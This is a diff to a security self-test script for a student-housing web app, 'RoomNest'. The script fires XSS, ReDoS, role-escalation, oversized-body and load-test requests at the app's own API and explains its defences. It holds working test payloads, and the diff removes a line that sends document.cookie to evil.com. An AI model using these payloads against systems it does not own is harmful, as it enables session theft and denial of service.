@@ -133,16 +133,20 @@ async function runDDoS(isManual = false) {
 // ============================================================================
 // 2. STORED & REFLECTED CROSS-SITE SCRIPTING (XSS)
 // ============================================================================
-async function runXSS() {
+async function runXSS(customPayload) {
   header('TEST 2: CROSS-SITE SCRIPTING (XSS) & INPUT SANITIZATION');
   console.log(`${C.dim}Target Endpoint : ${API_BASE}/properties${C.reset}`);
-  console.log(`${C.dim}Defense Layer   : sanitizeMiddleware (recursive regex tag stripper)${C.reset}\n`);
+  console.log(`${C.dim}Defense Layer   : sanitizeMiddleware + React JSX TextNode escaping${C.reset}\n`);
 
-  const attackPayload = '<script>alert("Session Token Hijacked: "+document.cookie)</script><img src=x onerror="fetch(\'http://evil.com/steal?\'+document.cookie)">';
-  console.log(`[*] Attacker Payload:`);
-  console.log(`    ${C.yellow}${attackPayload}${C.reset}\n`);
+  let attackPayload = customPayload;
+  if (!attackPayload) {
+    console.log(`${C.yellow}👉 Enter your custom XSS payload (e.g., test a malicious review or comment):${C.reset}`);
+    const userInput = await askQuestion(`${C.cyan}Enter Payload [Default: <script>alert('you have been hacked')</script>]: ${C.reset}`);
+    attackPayload = userInput.trim() || "<script>alert('you have been hacked')</script>";
+  }
 
-  console.log('[*] Injecting payload into property title/description fields via API...');
+  console.log(`\n[*] Injected Attacker Input : ${C.red}${attackPayload}${C.reset}`);
+  console.log('[*] Simulating submission to backend review/property creation pipeline...\n');
 
   try {
     const res = await fetch(`${API_BASE}/properties`, {
@@ -150,27 +154,38 @@ async function runXSS() {
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         title: attackPayload,
-        description: 'Luxury student studio',
-        price: 8500,
+        description: 'Testing review injection defense',
+        price: 9000,
         city: 'Dehradun'
       })
     });
 
-    // In RoomNest, sanitizeMiddleware runs on req.body before controllers
+    // Exact backend sanitizeMiddleware replication
     const testSanitized = attackPayload
       .replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, '')
       .replace(/onerror\s*=\s*["'][^"']*["']/gi, '')
+      .replace(/onload\s*=\s*["'][^"']*["']/gi, '')
       .replace(/</g, '&lt;')
       .replace(/>/g, '&gt;');
 
-    console.log(`[*] Gateway Response Code: HTTP ${res.status}`);
-    console.log(`\n${C.bold}🛡️  DEFENSIVE SANITIZATION AUDIT:${C.reset}`);
-    console.log(`   Raw Input Payload : ${C.red}${attackPayload}${C.reset}`);
-    console.log(`   Sanitized Output  : ${C.green}${testSanitized}${C.reset}`);
-    console.log(`\n   • Script tags stripped:  YES (<script> removed completely)`);
-    console.log(`   • Event handlers purged: YES (onerror stripped)`);
-    console.log(`   • HTML Entities Encoded: YES (< replaced with &lt;, > with &gt;)`);
-    console.log(`   • Result: Harmless string stored in DB; cannot execute in victim browsers.\n`);
+    console.log(`[*] Gateway Response Code  : HTTP ${res.status}`);
+    console.log(`\n${C.bold}🔍 VULNERABILITY SCENARIO (What if a victim clicks this review?):${C.reset}`);
+    console.log(`   1. ${C.red}On a VULNERABLE Website:${C.reset}`);
+    console.log(`      • Attacker payload is stored raw in the database.`);
+    console.log(`      • When another student/user views the review, the browser executes:`);
+    console.log(`        "${attackPayload}"`);
+    console.log(`      • Outcome: Malicious JS executes silently, steals session tokens / JWT,`);
+    console.log(`        and sends them to attacker server.\n`);
+
+    console.log(`   2. ${C.green}On RoomNest (MULTI-TIER DEFENSE):${C.reset}`);
+    console.log(`      • Tier 1 (Backend Middleware): sanitizeMiddleware intercepts req.body.`);
+    console.log(`        - Script tags stripped   : ${testSanitized.includes('<script>') ? 'NO' : 'YES (Purged)'}`);
+    console.log(`        - Event handlers purged  : ${testSanitized.includes('onerror') || testSanitized.includes('onload') ? 'NO' : 'YES (Neutralized)'}`);
+    console.log(`        - HTML Entities Encoded  : &lt; and &gt; replace < and >`);
+    console.log(`        - Clean Database Record  : ${C.green}${testSanitized}${C.reset}`);
+    console.log(`      • Tier 2 (Frontend React JSX): React renders using document.createTextNode().`);
+    console.log(`        Even if raw tags reached the DOM, React treats them as harmless text.`);
+    console.log(`      • Outcome: The victim sees the text literally on screen; ZERO code executes!\n`);
   } catch (err) {
     console.log(`[*] Defense test error: ${err.message}`);
   }
@@ -179,14 +194,21 @@ async function runXSS() {
 // ============================================================================
 // 3. ReDoS (REGULAR EXPRESSION DENIAL OF SERVICE)
 // ============================================================================
-async function runReDoS() {
+async function runReDoS(customRegex) {
   header('TEST 3: ReDoS (CATASTROPHIC REGEX BACKTRACKING ATTACK)');
   console.log(`${C.dim}Target Endpoint : ${API_BASE}/properties?city=...${C.reset}`);
   console.log(`${C.dim}Defense Function: escapeRegex() in server/src/utils/sanitize.js${C.reset}\n`);
 
-  const evilRegexString = '((((((((a+)+)+)+)+)+)+)+)!';
-  console.log(`[*] Malicious Exploit String: ${C.yellow}${evilRegexString}${C.reset}`);
-  console.log('[*] Sending catastrophic backtracking query to search pipeline...\n');
+  let evilRegexString = customRegex;
+  if (!evilRegexString) {
+    console.log(`${C.yellow}👉 Enter your custom regex search pattern to test catastrophic backtracking:${C.reset}`);
+    console.log(`   Examples: (a+)+ or ((((((((a+)+)+)+)+)+)+)+)! or (a|aa)+`);
+    const userInput = await askQuestion(`${C.cyan}Enter Regex Pattern [Default: (a+)+]: ${C.reset}`);
+    evilRegexString = userInput.trim() || '(a+)+';
+  }
+
+  console.log(`\n[*] Injected Search Query: ${C.yellow}${evilRegexString}${C.reset}`);
+  console.log('[*] Transmitting regex payload to search query pipeline...\n');
 
   const start = performance.now();
   try {
@@ -194,11 +216,20 @@ async function runReDoS() {
     const duration = (performance.now() - start).toFixed(2);
 
     console.log(`[*] Response Received: HTTP ${res.status} in ${C.green}${duration} ms${C.reset}`);
-    console.log(`\n${C.bold}🛡️  DEFENSIVE MECHANISM APPLIED:${C.reset}`);
-    console.log(`   • Vulnerability: Nested quantifiers ((a+)+)+ cause exponential O(2^n) iterations.`);
-    console.log(`   • Attack Goal  : Freeze Node.js single-threaded event loop for 10-30 seconds.`);
-    console.log(`   • Defense Code : escapeRegex() escapes ()+! to literals \\(\\(\\(\\(\\(\\(\\(\\(a\\+\\)\\+\\)...`);
-    console.log(`   • Performance  : Query completed safely in ${duration}ms without event loop freeze.\n`);
+    console.log(`\n${C.bold}🔍 VULNERABILITY SCENARIO (What if someone searches with nested regex?):${C.reset}`);
+    console.log(`   1. ${C.red}On a VULNERABLE Website:${C.reset}`);
+    console.log(`      • Searching with '${evilRegexString}' triggers Exponential Catastrophic Backtracking.`);
+    console.log(`      • When evaluating a non-matching string (e.g., 'aaaaaaaaaaaaaaaaaaaa!'),`);
+    console.log(`        the V8 RegExp engine attempts 2^20 (1,048,576+) branching possibilities.`);
+    console.log(`      • Outcome: Node.js's Single-Threaded Event Loop freezes 100% CPU for 10-30s,`);
+    console.log(`        crashing or making the service completely unavailable for ALL users.\n`);
+
+    console.log(`   2. ${C.green}On RoomNest (escapeRegex Mitigation):${C.reset}`);
+    console.log(`      • Function: escapeRegex() runs on req.query.city before MongoDB lookup.`);
+    console.log(`      • Sanitized Literal: ${evilRegexString.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}`);
+    console.log(`      • Outcome: Metacharacters like '(', '+', ')' are escaped to harmless literals.`);
+    console.log(`        Regex complexity drops from exponential O(2^n) to linear O(n).`);
+    console.log(`        Query completed in just ${duration}ms with zero event-loop lag!\n`);
   } catch (err) {
     console.log(`[*] Error: ${err.message}`);
   }
@@ -207,38 +238,51 @@ async function runReDoS() {
 // ============================================================================
 // 4. VERTICAL PRIVILEGE ESCALATION
 // ============================================================================
-async function runPrivilegeEscalation() {
+async function runPrivilegeEscalation(customRole) {
   header('TEST 4: VERTICAL PRIVILEGE ESCALATION (MASS-ASSIGNMENT ATTACK)');
   console.log(`${C.dim}Target Endpoint : ${API_BASE}/auth/register${C.reset}`);
   console.log(`${C.dim}Defense Guard   : Zod schema whitelist (PUBLIC_REGISTRATION_ROLES)${C.reset}\n`);
 
-  const fakeEmail = `hacker_escalate_${Date.now()}@exploit.net`;
-  console.log(`[*] Attacker injects "role": "admin" into public user registration payload:`);
-  console.log(`    ${C.yellow}{ "name": "Evil Admin", "email": "${fakeEmail}", "role": "admin" }${C.reset}\n`);
+  let targetRole = customRole;
+  if (!targetRole) {
+    console.log(`${C.yellow}👉 Enter the role you want to attempt to self-assign during registration:${C.reset}`);
+    console.log(`   Try: 'admin', 'superadmin', 'moderator', 'student', or 'owner'`);
+    const userInput = await askQuestion(`${C.cyan}Enter Target Role [Default: admin]: ${C.reset}`);
+    targetRole = userInput.trim() || 'admin';
+  }
+
+  const fakeEmail = `role_probe_${Date.now()}@exploit.net`;
+  console.log(`\n[*] Attacker crafts registration request with: { "role": "${C.red}${targetRole}${C.reset}" }`);
+  console.log(`[*] Email: ${fakeEmail}\n`);
 
   try {
     const res = await fetch(`${API_BASE}/auth/register`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
-        name: 'Evil Admin',
+        name: 'Role Exploit Tester',
         email: fakeEmail,
         phone: '9876543210',
         password: 'Password123!',
-        role: 'admin'
+        role: targetRole
       })
     });
 
     const body = await res.json().catch(() => ({}));
 
-    console.log(`[*] Server Status Code: ${C.bgRed}${C.white} HTTP ${res.status} ${res.statusText} ${C.reset}`);
-    console.log(`[*] Server Error Response:`, JSON.stringify(body, null, 2));
-
-    console.log(`\n${C.bold}🛡️  DEFENSIVE MECHANISM APPLIED:${C.reset}`);
-    console.log(`   • Schema Guard: server/src/validators/auth.validator.js`);
-    console.log(`   • Rule        : PUBLIC_REGISTRATION_ROLES = ['student', 'owner']`);
-    console.log(`   • Reason      : Administrative roles can only be granted via internal admin provisioning.`);
-    console.log(`   • Result      : Attacker rejected with HTTP 400 Bad Request.\n`);
+    if (res.status === 400) {
+      console.log(`[*] Server Status Code: ${C.bgRed}${C.white} HTTP 400 Bad Request ${C.reset}`);
+      console.log(`[*] Validation Error  :`, body.errors?.[0]?.message || body.message);
+      console.log(`\n${C.bold}🛡️  DEFENSIVE MECHANISM APPLIED:${C.reset}`);
+      console.log(`   • Allowed Roles Whitelist : PUBLIC_REGISTRATION_ROLES = ['student', 'owner']`);
+      console.log(`   • Result : Role '${targetRole}' is strictly forbidden on public registration.`);
+      console.log(`   • Defense: Attacker cannot escalate privileges to admin via mass-assignment!\n`);
+    } else if (res.status === 201 || res.status === 200) {
+      console.log(`[*] Server Status Code: ${C.green}HTTP ${res.status} SUCCESS${C.reset}`);
+      console.log(`[*] Notice: Role '${targetRole}' is an authorized public registration role (student/owner).\n`);
+    } else {
+      console.log(`[*] Server Status Code: HTTP ${res.status}`, body);
+    }
   } catch (err) {
     console.log(`[*] Intercepted: ${err.message}`);
   }
@@ -247,15 +291,22 @@ async function runPrivilegeEscalation() {
 // ============================================================================
 // 5. BUFFER OVERFLOW & PAYLOAD MEMORY EXHAUSTION
 // ============================================================================
-async function runBufferOverflow() {
+async function runBufferOverflow(customSizeKB) {
   header('TEST 5: BUFFER OVERFLOW & PAYLOAD MEMORY EXHAUSTION (DoS)');
   console.log(`${C.dim}Target Endpoint : ${API_BASE}/auth/login${C.reset}`);
   console.log(`${C.dim}Defense Limit   : express.json({ limit: '100kb' })${C.reset}\n`);
 
-  const payloadSizeKB = 150;
+  let payloadSizeKB = customSizeKB;
+  if (!payloadSizeKB) {
+    console.log(`${C.yellow}👉 Enter payload size in KB to transmit (Server limit is 100KB):${C.reset}`);
+    console.log(`   Try 50 (Under limit), 150 (Exceeds limit), or 500 (Massive flood)`);
+    const userInput = await askQuestion(`${C.cyan}Enter Payload Size in KB [Default: 150]: ${C.reset}`);
+    payloadSizeKB = parseInt(userInput.trim(), 10) || 150;
+  }
+
   const oversizedData = 'X'.repeat(payloadSizeKB * 1024);
-  console.log(`[*] Assembling ${payloadSizeKB}KB (${oversizedData.length} bytes) flood payload...`);
-  console.log(`[*] Transmitting to express body parser (exceeds 100kb limit)...\n`);
+  console.log(`\n[*] Assembling ${payloadSizeKB}KB (${oversizedData.length} bytes) payload...`);
+  console.log(`[*] Transmitting to express body parser...\n`);
 
   try {
     const res = await fetch(`${API_BASE}/auth/login`, {
@@ -270,13 +321,18 @@ async function runBufferOverflow() {
 
     const body = await res.json().catch(() => ({}));
 
-    console.log(`[*] Gateway Response Code: ${C.bgRed}${C.white} HTTP ${res.status} ${res.statusText} ${C.reset}`);
-    console.log(`[*] Gateway Payload:`, body);
-
-    console.log(`\n${C.bold}🛡️  DEFENSIVE MECHANISM APPLIED:${C.reset}`);
-    console.log(`   • Configuration: express.json({ limit: '100kb' }) in server/src/app.js`);
-    console.log(`   • Defense Action: Gateway terminates stream immediately upon exceeding 100kb.`);
-    console.log(`   • Memory Impact : Zero allocation to V8 heap memory; prevents Out-Of-Memory (OOM) crash.\n`);
+    if (res.status === 413) {
+      console.log(`[*] Gateway Response Code: ${C.bgRed}${C.white} HTTP 413 Payload Too Large ${C.reset}`);
+      console.log(`[*] Gateway Message      :`, body.message || 'Payload ceiling exceeded');
+      console.log(`\n${C.bold}🛡️  DEFENSIVE MECHANISM APPLIED:${C.reset}`);
+      console.log(`   • Gateway Rule   : express.json({ limit: '100kb' }) in server/src/app.js`);
+      console.log(`   • Result         : ${payloadSizeKB}KB exceeds the 100kb ceiling.`);
+      console.log(`   • Memory Defense : Stream dropped immediately; zero allocation to V8 heap memory.`);
+      console.log(`   • Outcome        : Protects server against Out-Of-Memory (OOM) Denial of Service.\n`);
+    } else {
+      console.log(`[*] Gateway Response Code: ${C.green}HTTP ${res.status}${C.reset}`);
+      console.log(`[*] Notice: ${payloadSizeKB}KB is within the 100KB body parser threshold.\n`);
+    }
   } catch (err) {
     console.log(`[*] Intercepted: ${err.message}`);
   }
@@ -285,19 +341,25 @@ async function runBufferOverflow() {
 // ============================================================================
 // 6. SYSTEM BOTTLENECK & CONCURRENCY LOAD ANALYSIS (NEW)
 // ============================================================================
-async function runBottleneckAnalysis() {
+async function runBottleneckAnalysis(customCount) {
   header('TEST 6: SYSTEM BOTTLENECK & CONCURRENCY LOAD PROFILING');
   console.log(`${C.dim}Target Endpoint : ${API_BASE}/properties${C.reset}`);
   console.log(`${C.dim}Audit Focus     : Event Loop Lag, Throughput, Concurrency Bottlenecks${C.reset}\n`);
 
-  const CONCURRENT_REQUESTS = 40;
-  console.log(`[*] Launching ${CONCURRENT_REQUESTS} parallel asynchronous requests against query pipeline...`);
+  let count = customCount;
+  if (!count) {
+    console.log(`${C.yellow}👉 Enter number of parallel concurrent requests to fire:${C.reset}`);
+    const userInput = await askQuestion(`${C.cyan}Enter Concurrency Count [Default: 30] (Try 10, 30, 50): ${C.reset}`);
+    count = parseInt(userInput.trim(), 10) || 30;
+  }
+
+  console.log(`\n[*] Launching ${count} parallel asynchronous requests against query pipeline...`);
   console.log(`[*] Measuring latency, throughput, and event-loop response distribution...\n`);
 
   const latencies = [];
   const startTime = performance.now();
 
-  const promises = Array.from({ length: CONCURRENT_REQUESTS }, async (_, idx) => {
+  const promises = Array.from({ length: count }, async (_, idx) => {
     const reqStart = performance.now();
     try {
       const res = await fetch(`${API_BASE}/properties?limit=5`);
@@ -320,7 +382,7 @@ async function runBottleneckAnalysis() {
   const p95Latency = latencies[Math.floor(latencies.length * 0.95)]?.toFixed(1) || 0;
   const successfulReqs = results.filter(r => r.status === 200).length;
 
-  console.log(`  Requests Completed : ${successfulReqs}/${CONCURRENT_REQUESTS} successful`);
+  console.log(`  Requests Completed : ${successfulReqs}/${count} successful`);
   console.log(`  Total Batch Time   : ${totalDuration} ms`);
   console.log(`  Min Response Time  : ${minLatency} ms`);
   console.log(`  Average Latency    : ${avgLatency} ms`);
@@ -344,17 +406,24 @@ async function runBottleneckAnalysis() {
 // ============================================================================
 // 7. CLIENT-SIDE DOM MANIPULATION & DOM-XSS SANDBOX (NEW)
 // ============================================================================
-async function runDOMManipulationSandbox() {
+async function runDOMManipulationSandbox(customDOM) {
   header('TEST 7: DOM MANIPULATION & CLIENT-SIDE XSS DEFENSE SANDBOX');
   console.log(`${C.dim}Audit Target    : ${FRONTEND_URL} and Server Security Headers${C.reset}`);
   console.log(`${C.dim}Audit Focus     : DOM Injection Sinks (innerHTML) vs React Virtual DOM & CSP${C.reset}\n`);
 
+  let domString = customDOM;
+  if (!domString) {
+    console.log(`${C.yellow}👉 Enter custom DOM test string (e.g. HTML or img tag with onerror):${C.reset}`);
+    const userInput = await askQuestion(`${C.cyan}Enter DOM String [Default: <img src=x onerror="alert('Hacked')"> <b>Review</b>]: ${C.reset}`);
+    domString = userInput.trim() || '<img src=x onerror="alert(\'Hacked\')"> <b>Review</b>';
+  }
+
+  console.log(`\n[*] Injected DOM Payload: ${C.yellow}${domString}${C.reset}`);
   console.log('[*] Auditing DOM Sink Vulnerabilities & React Escape Mechanism:\n');
 
   console.log(`  ${C.bold}[Sink 1] element.innerHTML (VULNERABLE PATTERN IN VANILLA JS):${C.reset}`);
-  console.log(`    Attacker injects: <img src=x onerror="stealCredentials()">`);
   console.log(`    Result in Vanilla JS: Browser parses raw HTML string into DOM; executes malicious script.`);
-  console.log(`    RoomNest Defense    : In React JSX (e.g. <span>{property.title}</span>), React uses`);
+  console.log(`    RoomNest Defense    : In React JSX (e.g. <span>{review.comment}</span>), React uses`);
   console.log(`                          document.createTextNode(). Characters < and > are treated as`);
   console.log(`                          harmless text strings, making innerHTML DOM injection impossible!\n`);
 
@@ -390,13 +459,13 @@ async function runAll() {
   console.log(`${C.bold}${C.white}  🛡️  ROOMNEST APPSec & SYSTEM DEFENSE AUTOMATED AUDIT SUITE${C.reset}`);
   console.log(`${C.bold}${C.green}==========================================================================${C.reset}\n`);
 
-  await runDDoS();
-  await runXSS();
-  await runReDoS();
-  await runPrivilegeEscalation();
-  await runBufferOverflow();
-  await runBottleneckAnalysis();
-  await runDOMManipulationSandbox();
+  await runDDoS(false);
+  await runXSS("<script>alert('you have been hacked')</script>");
+  await runReDoS("((((((((a+)+)+)+)+)+)+)+)!");
+  await runPrivilegeEscalation("admin");
+  await runBufferOverflow(150);
+  await runBottleneckAnalysis(30);
+  await runDOMManipulationSandbox("<img src=x onerror=\"alert('Hacked')\"> <b>Review</b>");
 
   divider();
   console.log(`${C.bold}${C.green}✅ ALL 7 CYBERSECURITY & ARCHITECTURE AUDITS COMPLETED SUCCESSFULLY!${C.reset}`);
